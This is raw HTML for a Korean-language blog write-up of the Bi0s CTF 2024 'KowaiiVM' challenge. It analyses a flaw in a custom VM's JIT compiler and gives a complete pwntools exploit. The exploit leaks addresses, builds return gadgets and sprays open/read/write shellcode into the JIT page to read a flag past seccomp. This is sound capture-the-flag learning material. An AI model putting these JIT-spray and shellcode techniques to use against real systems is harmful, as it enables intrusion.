@@ -1,0 +1,901 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Bi0s CTF 2024 - KowaiiVM | msh1307</title>
+<meta name="keywords" content="Bi0s CTF 2024, JIT Exploit">
+<meta name="description" content="Kowaii VM Analysis 문제에서 소스코드를 제공해준다.
+---- 0x0000 Header data ---- 0x1000 .CODE ---- bss &gt;= 0xc000 .BSS ---- 0xffff 위와 같은 바이너리 구조를 입력으로 받는다.
+void prepareCtx() { this-&gt;prepareFuncTable(); this-&gt;regs-&gt;bp = (u64 *)mmap(this-&gt;genAddr(), STACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0); if(this-&gt;regs-&gt;bp == (void *)(-1)) error(&#34;Unable to map stack!&#34;); this-&gt;regs-&gt;bp &#43;= (STACK_SIZE)/sizeof(u64); this-&gt;regs-&gt;sp = this-&gt;regs-&gt;bp; this-&gt;jitBase = (u8 *)mmap(this-&gt;genAddr(), JIT_SIZE, PROT_READ | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0); if(this-&gt;jitBase == (void *)(-1)) error(&#34;Unable to allocate executable memory!">
+<meta name="author" content="">
+<link rel="canonical" href="https://msh1307.kr/blog/bi0s_ctf_2024_kowaiivm/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.d9c43e0c7cae3b38c51e79921ad3cf2685d9811a56593a817d9b57ac4fdebf2b.css" integrity="sha256-2cQ&#43;DHyuOzjFHnmSGtPPJoXZgRpWWTqBfZtXrE/evys=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js" integrity="sha256-uVus3DnjejMqn4g7Hni&#43;Srwf3KK8HyZB9V4809q9TWE="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-BR89V2WEC0');
+</script>
+<link rel="icon" href="https://msh1307.kr/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://msh1307.kr/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://msh1307.kr/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://msh1307.kr/apple-touch-icon.png">
+<link rel="mask-icon" href="https://msh1307.kr/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Bi0s CTF 2024 - KowaiiVM" />
+<meta property="og:description" content="Kowaii VM Analysis 문제에서 소스코드를 제공해준다.
+---- 0x0000 Header data ---- 0x1000 .CODE ---- bss &gt;= 0xc000 .BSS ---- 0xffff 위와 같은 바이너리 구조를 입력으로 받는다.
+void prepareCtx() { this-&gt;prepareFuncTable(); this-&gt;regs-&gt;bp = (u64 *)mmap(this-&gt;genAddr(), STACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0); if(this-&gt;regs-&gt;bp == (void *)(-1)) error(&#34;Unable to map stack!&#34;); this-&gt;regs-&gt;bp &#43;= (STACK_SIZE)/sizeof(u64); this-&gt;regs-&gt;sp = this-&gt;regs-&gt;bp; this-&gt;jitBase = (u8 *)mmap(this-&gt;genAddr(), JIT_SIZE, PROT_READ | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0); if(this-&gt;jitBase == (void *)(-1)) error(&#34;Unable to allocate executable memory!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://msh1307.kr/blog/bi0s_ctf_2024_kowaiivm/" /><meta property="article:section" content="blog" />
+<meta property="article:published_time" content="2024-03-20T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2024-03-20T00:00:00&#43;00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Bi0s CTF 2024 - KowaiiVM"/>
+<meta name="twitter:description" content="Kowaii VM Analysis 문제에서 소스코드를 제공해준다.
+---- 0x0000 Header data ---- 0x1000 .CODE ---- bss &gt;= 0xc000 .BSS ---- 0xffff 위와 같은 바이너리 구조를 입력으로 받는다.
+void prepareCtx() { this-&gt;prepareFuncTable(); this-&gt;regs-&gt;bp = (u64 *)mmap(this-&gt;genAddr(), STACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0); if(this-&gt;regs-&gt;bp == (void *)(-1)) error(&#34;Unable to map stack!&#34;); this-&gt;regs-&gt;bp &#43;= (STACK_SIZE)/sizeof(u64); this-&gt;regs-&gt;sp = this-&gt;regs-&gt;bp; this-&gt;jitBase = (u8 *)mmap(this-&gt;genAddr(), JIT_SIZE, PROT_READ | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0); if(this-&gt;jitBase == (void *)(-1)) error(&#34;Unable to allocate executable memory!"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Blogs",
+      "item": "https://msh1307.kr/blog/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "Bi0s CTF 2024 - KowaiiVM",
+      "item": "https://msh1307.kr/blog/bi0s_ctf_2024_kowaiivm/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Bi0s CTF 2024 - KowaiiVM",
+  "name": "Bi0s CTF 2024 - KowaiiVM",
+  "description": "Kowaii VM Analysis 문제에서 소스코드를 제공해준다.\n---- 0x0000 Header data ---- 0x1000 .CODE ---- bss \u0026gt;= 0xc000 .BSS ---- 0xffff 위와 같은 바이너리 구조를 입력으로 받는다.\nvoid prepareCtx() { this-\u0026gt;prepareFuncTable(); this-\u0026gt;regs-\u0026gt;bp = (u64 *)mmap(this-\u0026gt;genAddr(), STACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0); if(this-\u0026gt;regs-\u0026gt;bp == (void *)(-1)) error(\u0026#34;Unable to map stack!\u0026#34;); this-\u0026gt;regs-\u0026gt;bp += (STACK_SIZE)/sizeof(u64); this-\u0026gt;regs-\u0026gt;sp = this-\u0026gt;regs-\u0026gt;bp; this-\u0026gt;jitBase = (u8 *)mmap(this-\u0026gt;genAddr(), JIT_SIZE, PROT_READ | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0); if(this-\u0026gt;jitBase == (void *)(-1)) error(\u0026#34;Unable to allocate executable memory!",
+  "keywords": [
+    "Bi0s CTF 2024", "JIT Exploit"
+  ],
+  "articleBody": "Kowaii VM Analysis 문제에서 소스코드를 제공해준다.\n---- 0x0000 Header data ---- 0x1000 .CODE ---- bss \u003e= 0xc000 .BSS ---- 0xffff 위와 같은 바이너리 구조를 입력으로 받는다.\nvoid prepareCtx() { this-\u003eprepareFuncTable(); this-\u003eregs-\u003ebp = (u64 *)mmap(this-\u003egenAddr(), STACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0); if(this-\u003eregs-\u003ebp == (void *)(-1)) error(\"Unable to map stack!\"); this-\u003eregs-\u003ebp += (STACK_SIZE)/sizeof(u64); this-\u003eregs-\u003esp = this-\u003eregs-\u003ebp; this-\u003ejitBase = (u8 *)mmap(this-\u003egenAddr(), JIT_SIZE, PROT_READ | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0); if(this-\u003ejitBase == (void *)(-1)) error(\"Unable to allocate executable memory!\"); this-\u003ejitEnd = this-\u003ejitBase + JIT_SIZE; this-\u003ecallStackBase = (kowaiiFuncEntry **)mmap(this-\u003egenAddr(), STACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0); if(this-\u003ecallStackBase == (void *)(-1)) error(\"Unable to map call stack!\"); this-\u003ecallStack = this-\u003ecallStackBase; this-\u003eregs-\u003epc = (u8 *)(this-\u003ebin)+this-\u003ebin-\u003eentry; this-\u003ebss = ((u8 *)(this-\u003ebin)+this-\u003ebin-\u003ebss); mprotect((void *)((u64)this-\u003ebin+CODE_START_ADDR), this-\u003ebin-\u003ebss-CODE_START_ADDR, PROT_READ); } }; 커스텀 바이너리를 입력으로 받는다.\ntext, bss 영역이 존재한다.\nvm context를 세팅하는 함수가 있는데 stack, jit page, callStack 모두 주소가 랜덤화된다.\nvm은 checkState에서 검증을 모두 수행하고 취약점이 발생하지 않는다.\n그리고 JIT compile이 활성화되었는지 아닌지에 따라서 callFunc, retFunc가 오버라이딩된다.\nvoid virtual callFunc() { u16 hash = *(u16 *)(this-\u003ectx.regs-\u003epc+1); kowaiiFuncEntry *fe = NULL; for(int i = 0; i \u003c this-\u003ectx.bin-\u003eno_funcs; i++) { if(hash == this-\u003ectx.bin-\u003efunct[i].hash) { fe = \u0026this-\u003ectx.bin-\u003efunct[i]; break; } } if(!fe) error(\"Invalid function call!\"); if(fe-\u003ecallCount \u003e= JIT_CC \u0026\u0026 fe-\u003esize \u003e= JIT_MS) { this-\u003ejitCall(fe); this-\u003ectx.regs-\u003epc += 3; return; } *(--this-\u003ectx.regs-\u003esp) = (u64)(this-\u003ectx.regs-\u003epc+3); this-\u003ectx.regs-\u003epc = (u8 *)fe-\u003eaddr; *(++this-\u003ectx.callStack) = fe; return; } void virtual retFunc() { this-\u003ectx.regs-\u003epc = (u8 *)(*this-\u003ectx.regs-\u003esp++); (*this-\u003ectx.callStack)-\u003ecallCount++; if((*this-\u003ectx.callStack)-\u003ecallCount \u003e= JIT_CC \u0026\u0026 (*this-\u003ectx.callStack)-\u003esize \u003e= JIT_MS ) this-\u003ejitGen(*this-\u003ectx.callStack); *(this-\u003ectx.callStack--) = NULL; return; } JIT이 활성화된 클래스를 확인해보면 retFunc에서 callStack을 빼면서 callCount를 수집한다.\n또한 CallCount를 JIT_CC와 비교해서 네이티브로 컴파일해 최적화를 수행한다.\n이미 앞서 vm에서 충분히 검증되었다고 믿고, JIT에선 검증없이 컴파일한다.\nvoid jitEmitIns(u64 INS, u16 reg1, u16 reg2, u16 reg3) { u8 insSize = 0; if(INS \u003c (1\u003c\u003c8)) insSize = 0x1; else if(INS \u003c (1\u003c\u003c16)) insSize = 0x2; else if(INS \u003c (1\u003c\u003c24)) insSize = 0x3; else insSize = 0x4; *(u64 *)(this-\u003ectx.jitBase) = INS; if(reg1 != x64_NOREG) { if(reg1 \u003c MAX_REGS) reg1 = x64_REG+reg1; else reg1 = reg1 \u0026 0x3; *(this-\u003ectx.jitBase+insSize-1) += reg1; } if(reg2 != x64_NOREG) { if(reg2 \u003c MAX_REGS) reg2 = x64_REG+reg2; else reg2 = reg2 \u0026 0x3; *(this-\u003ectx.jitBase+insSize-1) += reg2 \u003c\u003c 3; } if(reg3 != x64_NOREG) { if(reg3 \u003c MAX_REGS) reg3 = x64_REG+reg3; else reg3 = reg3 \u0026 0x3; *(this-\u003ectx.jitBase+insSize-2) += reg3 \u003c\u003c 3; } this-\u003ectx.jitBase += insSize; } void jitGen(kowaiiFuncEntry *fe) { ... mprotect(this-\u003ectx.jitEnd-JIT_SIZE, JIT_SIZE, PROT_READ | PROT_WRITE); fe-\u003eaddr = (u64)this-\u003ectx.jitBase; while(i \u003c fe-\u003esize) { if(this-\u003ectx.jitBase \u003e= this-\u003ectx.jitEnd) error(\"Out of executable memory!\"); kfe = NULL; reg1 = code[i+1]; reg2 = code[i+2]; reg3 = code[i+3]; imm = *(u64 *)(code+i+2); hash = *(u16 *)(code+i+1); switch(code[i]) { case ADD: if(reg1 != reg2 \u0026\u0026 reg1 != reg3) { this-\u003ejitEmitIns(x64_MOVNN, reg1, reg2, x64_NOREG); this-\u003ejitEmitIns(x64_ADD, reg1, reg3, x64_NOREG); } else { if(reg1 == reg2) this-\u003ejitEmitIns(x64_ADD, reg1, reg3, x64_NOREG); else this-\u003ejitEmitIns(x64_ADD, reg1, reg2, x64_NOREG); } i += 4; break; ... cleanup: *this-\u003ectx.jitBase++ = x64_RET; mprotect(this-\u003ectx.jitEnd-JIT_SIZE, JIT_SIZE, PROT_READ | PROT_EXEC); } 검증없이 set / get oob가 발생할 가능성이 있다.\n근데 앞서 최적화되기 전에 검증이 있기 때문에 code가 런타임에 수정되지 않는한 취약하지 않다.\nvoid prepareFuncTable() { for(int i = 0; i \u003c this-\u003ebin-\u003eno_funcs; i++) { u64 addr = (u64)(this-\u003ebin-\u003efunct[i].addr); if(addr \u003e this-\u003ebin-\u003ebss || addr \u003c CODE_START_ADDR) error(\"Invalid function table!\"); 근데 앞서 검증할때 code address \u003c this-\u003ebin-\u003ebss 여야하고, 이에 부정은 code address \u003e= this-\u003ebin-\u003ebss 이기 때문에 bss 영역에 코드를 작성하고 call hash를 통해 런타임에 수정되는 코드를 만들 수 있다.\nVulnerability 사실 bss에 쓰기 가능한 코드를 이용해 JIT gen 함수의 취약점을 악용할 필요도 없이 설계상의 문제로도 그냥 익스플로잇이 가능했다.\n한번 JIT 컴파일이 되면, push / pop 같은 스택 조작 명령을 통해 실제 레지스터 rip에 대한 컨트롤이 가능하다.\n근본적으로 vm에서 host rsp를 그대로 이용하는거 자체가 문제이다.\nExploit __attribute__((noinline)) __attribute__((naked)) void jitCall(kowaiiFuncEntry *fe) { __asm__( \"push rbp;\" \"push r8;\" \"push r9;\" \"push r10;\" \"push r11;\" \"push r12;\" \"push r13;\" \"push r14;\" \"push r15;\" \"push rdi;\" \"push rdx;\" \"push rcx;\" \"xor r8, r8;\" \"xor r9, r9;\" \"mov rbp, rsp;\" \"mov rdx, qword ptr [rdi+0x28];\" \"mov rdi, qword ptr [rdi+0x10];\" \"mov r10, qword ptr [rdi];\" \"mov r11, qword ptr [rdi+0x8];\" \"mov r12, qword ptr [rdi+0x10];\" \"mov r13, qword ptr [rdi+0x18];\" \"mov r14, qword ptr [rdi+0x20];\" \"mov r15, qword ptr [rdi+0x28];\" \"mov rsp, qword ptr [rdi+0x38];\" \"call qword ptr [rsi+0x2];\" \"mov qword ptr [rdi], r10;\" \"mov qword ptr [rdi+0x8], r11;\" \"mov qword ptr [rdi+0x10], r12;\" \"mov qword ptr [rdi+0x18], r13;\" \"mov qword ptr [rdi+0x20], r14;\" \"mov qword ptr [rdi+0x28], r15;\" \"mov rsp, rbp;\" \"pop rcx;\" \"pop rdx;\" \"pop rdi;\" \"pop r15;\" \"pop r14;\" \"pop r13;\" \"pop r12;\" \"pop r11;\" \"pop r10;\" \"pop r9;\" \"pop r8;\" \"pop rbp;\" \"ret\" ); } 근본적으로 call 함수에서 rsp에 직접 vm 스택의 주소가 담기고, 실제로 push / pop / call 을 수행할 수 있다면 JIT page도 릭할 수 있다.\nJIT compile된 함수는 이미 JIT compile된 함수만 call이 가능하다.\ncall 이전에 이미 rsp는 vm stack의 주소로 변경되었으니 이를 이용해 JIT page leak이 가능하다.\n그리고 pop ret 가젯을 만들고 push ret 가젯을 만들어서 pop으로 binary base를 구하고 push ret으로 context 복구가 가능하다.\n#ifdef SECCOMP void kowaiiSeccomp() { scmp_filter_ctx sctx; sctx = seccomp_init(SCMP_ACT_KILL); seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(mprotect), 0); seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(lseek), 0); seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0); seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0); seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0); seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0); seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); cout \u003c\u003c \"[*] Applying seccomp filetrs, no escape ;)\" \u003c\u003c endl; close(STDIN_FILENO); if(seccomp_load(sctx)) error(\"Seccomp error :^(\"); } #endif seccomp bypass를 위해서 JIT에 mov imm32를 통해서 4바이트씩 쉘코드를 작성하고 \\xeb\\x02로 쉘코드를 이었다.\nExploit from pwn import * class COMPILER: ADD =0xb0 SUB =0xb1 MUL =0xb2 SHR =0xb3 SHL =0xb4 PUSH =0xb5 POP =0xb6 GET =0xb7 SET =0xb8 MOV =0xb9 CALL =0xba RET =0xbb NOP =0xbc HLT =0xbf @staticmethod def add(dst, src1, src2): payload = b'' payload += p8(compiler.ADD) payload += p8(dst) payload += p8(src1) payload += p8(src2) return payload @staticmethod def sub(dst, src1, src2): payload = b'' payload += p8(compiler.SUB) payload += p8(dst) payload += p8(src1) payload += p8(src2) return payload @staticmethod def mov(dst, imm32): payload = b'' payload += p8(compiler.MOV) payload += p8(dst) payload += p32(imm32) return payload @staticmethod def shl(dst, imm8): payload = b'' payload += p8(compiler.SHL) payload += p8(dst) payload += p8(imm8) return payload @staticmethod def get(dst,imm32): payload = b'' payload += p8(compiler.GET) payload += p8(dst) payload += p32(imm32) return payload @staticmethod def set(src,imm32): payload = b'' payload += p8(compiler.SET) payload += p8(src) payload += p32(imm32) return payload @staticmethod def call(hash): payload = b'' payload += p8(compiler.CALL) payload += p16(hash) return payload @staticmethod def ret(): payload = b'' payload += p8(compiler.RET) return payload @staticmethod def hlt(): payload = b'' payload += p8(compiler.HLT) return payload @staticmethod def push(reg): payload = b'' payload += p8(compiler.PUSH) payload += p8(reg) return payload @staticmethod def pop(reg): payload = b'' payload += p8(compiler.POP) payload += p8(reg) return payload @staticmethod def nop(): payload = b'' payload += p8(compiler.NOP) return payload @staticmethod def shl(dst, imm8): payload = b'' payload += p8(compiler.SHL) payload += p8(dst) payload += p8(imm8) return payload class KOWAII: CODE_START = 0x1000 def __init__(self, bss): self.funcs = [] assert bss \u003e= 0xc000 self.bss = bss self.entry = 0 self.code = b'' self.bss_data = b'' def set_main(self,code): self.entry = len(self.code) + KOWAII.CODE_START self.code += code def add_func(self, code, addr = 0xdeadbeef, sz = 0xdeadbeef): assert len(self.funcs) \u003c= 0x80 if addr == 0xdeadbeef: addr = len(self.code)+KOWAII.CODE_START if sz == 0xdeadbeef: sz = len(code) f = { 'hash' : len(self.funcs), 'addr' : addr, 'size' : sz, 'callCount' : 0, } self.code += code self.funcs.append(f) def get_binary(self): binary = b'KOWAII' binary += p16(self.entry) binary += p32(0xdeadc0de) binary += p16(self.bss) binary += p8(len(self.funcs)) for i in self.funcs: binary += p16(i['hash']) binary += p64(i['addr']) binary += p8(i['size']) binary += p8(i['callCount']) binary += b'\\x00' * (KOWAII.CODE_START-len(binary)) binary += self.code if len(self.bss_data) \u003e 0: binary += b'\\x00' * (self.bss - len(binary)) binary += self.bss_data return binary def get_func(self, idx): return self.funcs[idx] def set_bss_data(self, data): self.bss_data = data if __name__ == '__main__': r0,r1,r2,r3,r4,r5 = 0,1,2,3,4,5 kowaii = KOWAII(bss=0xc000) compiler = COMPILER() pop_func = b'' # JIT_MS = 0xa pop_func += compiler.pop(r0) pop_func += compiler.nop() * 0x10 pop_func += compiler.ret() popf = 0 get_pc = b'' # will not be optimized get_pc += compiler.pop(r0) get_pc += compiler.set(r0, 0xf00) get_pc += compiler.push(r0) get_pc += compiler.ret() get_pcf = 1 kowaii.add_func(pop_func) kowaii.add_func(get_pc) def optimize(func, additional_code_perloop = b'',additional_code_perloop1 = b'' ,JIT_CC = 0xa, JIT_MS = 0xa): assert kowaii.get_func(func)['size'] \u003e= JIT_MS code = b'' code += compiler.call(get_pcf) code += compiler.get(r5, 0xf00) for it in range(JIT_CC): code += compiler.mov(r1, 6+(13+len(additional_code_perloop+additional_code_perloop1))*(it+1)) code += compiler.add(r1,r5,r1) code += additional_code_perloop code += compiler.call(func) code += additional_code_perloop1 return code ''' - vmpc \u0026 r0 ~ r5 can be controlled - rip \u0026 rax, cl, rdx, r10 ~ r15 can be controlled - writable bss can be controlled ''' # 1) Leak JIT page jit_leak = b'' jit_leak += compiler.nop() * 0x10 jit_leak += compiler.call(popf) jit_leak += compiler.ret() jit_leakf = 2 kowaii.add_func(jit_leak) main = b'' main += optimize(jit_leakf, additional_code_perloop1= compiler.push(r1) + compiler.ret()) # popf is already optimized # main += optimize(popf, additional_code_perloop = compiler.push(r1)) # already optimized main += compiler.call(jit_leakf) main += compiler.mov(r1, 0xf) main += compiler.sub(r0, r0, r1) main += compiler.set(r0, 0xf08) # bss+0xf08 = JIT page # 2) Leak binary base # call pop ret -\u003e push ret -\u003e flow recover push_ret = compiler.nop() * 0x10 push_ret += compiler.push(r0) push_ret += compiler.ret() kowaii.add_func(push_ret) pushf = 3 main += optimize(pushf, additional_code_perloop = compiler.mov(r2,0) + compiler.add(r0,r1,r2)) main += compiler.mov(r1, 0x10) main += compiler.get(r0, 0xf08) # get JIT main += compiler.add(r0, r1, r0) main += compiler.push(r0) # r0 = (push r10; ret) main += compiler.call(popf) # return to (push r10; ret) which will recover the context main += compiler.mov(r1, 0x4193) main += compiler.sub(r0, r0, r1) # get binbase main += compiler.set(r0, 0xf10) # bss+0xf10 = binbase # 3) write shellcode in JIT # 0x0000000000004b0e : add byte ptr [rax + 0x29], cl ; ret # once call opcode is jit compiled and executed, rax always points to the JIT address. # and cl register can be controlled using shl opcode # 3) vmpc = bss and modifying imm32 of mov # once SET/GET instruction is jit compiled, bounds check is eliminated # if(addr \u003e this-\u003ebin-\u003ebss || addr \u003c CODE_START_ADDR) error(\"Invalid function table!\"); # function entry can point to the starting point of bss def gen_shellcode(c): code = asm(c) assert len(code) \u003c= 2 payload = compiler.mov(0, u32(code.ljust(2,b'\\x90') + b'\\xeb\\x02')) return payload # context.arch = 'amd64' # shellcode = b'' # shellcode += gen_shellcode('xor eax, eax') # shellcode += gen_shellcode('inc eax') # shellcode += gen_shellcode('inc eax') # shellcode += gen_shellcode('push r11') # path # shellcode += gen_shellcode('pop rdi') # shellcode += gen_shellcode('push 0') # shellcode += gen_shellcode('pop rsi') # shellcode += gen_shellcode('push 0') # shellcode += gen_shellcode('pop rdx') # shellcode += gen_shellcode('syscall') # shellcode += gen_shellcode('push rax') # shellcode += gen_shellcode('pop rdi') # shellcode += gen_shellcode('push rsp') # shellcode += gen_shellcode('pop rsi') # shellcode += gen_shellcode('push 0x7f') # shellcode += gen_shellcode('pop rdx') # shellcode += gen_shellcode('xor eax, eax') # shellcode += gen_shellcode('syscall') # shellcode += gen_shellcode('xor eax, eax') # shellcode += gen_shellcode('inc eax') # shellcode += gen_shellcode('push rsp') # shellcode += gen_shellcode('pop rsi') # shellcode += gen_shellcode('push 1') # shellcode += gen_shellcode('pop rdi') # shellcode += gen_shellcode('push 0x7f') # shellcode += gen_shellcode('pop rdx') # shellcode += gen_shellcode('syscall') # shellcode += compiler.ret() # print(list(shellcode)) shellcode = bytes([185, 0, 49, 192, 235, 2, 185, 0, 255, 192, 235, 2, 185, 0, 255, 192, 235, 2, 185, 0, 65, 83, 235, 2, 185, 0, 95, 144, 235, 2, 185, 0, 106, 0, 235, 2, 185, 0, 94, 144, 235, 2, 185, 0, 106, 0, 235, 2, 185, 0, 90, 144, 235, 2, 185, 0, 15, 5, 235, 2, 185, 0, 80, 144, 235, 2, 185, 0, 95, 144, 235, 2, 185, 0, 84, 144, 235, 2, 185, 0, 94, 144, 235, 2, 185, 0, 106, 127, 235, 2, 185, 0, 90, 144, 235, 2, 185, 0, 49, 192, 235, 2, 185, 0, 15, 5, 235, 2, 185, 0, 49, 192, 235, 2, 185, 0, 255, 192, 235, 2, 185, 0, 84, 144, 235, 2, 185, 0, 94, 144, 235, 2, 185, 0, 106, 1, 235, 2, 185, 0, 95, 144, 235, 2, 185, 0, 106, 127, 235, 2, 185, 0, 90, 144, 235, 2, 185, 0, 15, 5, 235, 2, 187]) kowaii.add_func(shellcode) shellcodef = 4 kowaii.set_bss_data(b'./flag.txt') main += optimize(shellcodef) main += compiler.get(r0, 0xf08) # get JIT main += compiler.mov(r1, 0x15) main += compiler.add(r0, r0, r1) main += compiler.push(r0)*0x20 main += compiler.push(r0) main += compiler.get(r0, 0xf00) # get bss main += compiler.mov(r1,0xad45) main += compiler.add(r1,r0,r1) main += compiler.shl(r5,0xf) main += compiler.call(popf) main += compiler.hlt() # shellcode start jit + 0x15 kowaii.set_main(main) binary = kowaii.get_binary() p = process('./out.bin',env={\"LD_mainLOAD\":\"./libm.so.6 ./libseccomp.so.2\"}) p.sendafter(b'binary',binary+b'\\x0a'*2) pause() p.sendlineafter(b'mode?',b'y') p.interactive() ",
+  "wordCount" : "2073",
+  "inLanguage": "en",
+  "datePublished": "2024-03-20T00:00:00Z",
+  "dateModified": "2024-03-20T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://msh1307.kr/blog/bi0s_ctf_2024_kowaiivm/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "msh1307",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://msh1307.kr/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header sticky-header">
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-BR89V2WEC0');
+    </script>
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://msh1307.kr" accesskey="h" title="msh1307 (Alt + H)">msh1307</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://msh1307.kr/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/blog" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/about" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/categories" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://msh1307.kr">Home</a>&nbsp;»&nbsp;<a href="https://msh1307.kr/blog/">Blogs</a></div>
+    <h1 class="post-title">
+      Bi0s CTF 2024 - KowaiiVM
+    </h1>
+    <div class="post-meta">
+
+
+March 2024
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">‎ Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#kowaii-vm" aria-label="Kowaii VM">Kowaii VM</a><ul>
+                        
+                <li>
+                    <a href="#analysis" aria-label="Analysis">Analysis</a><ul>
+                        
+                <li>
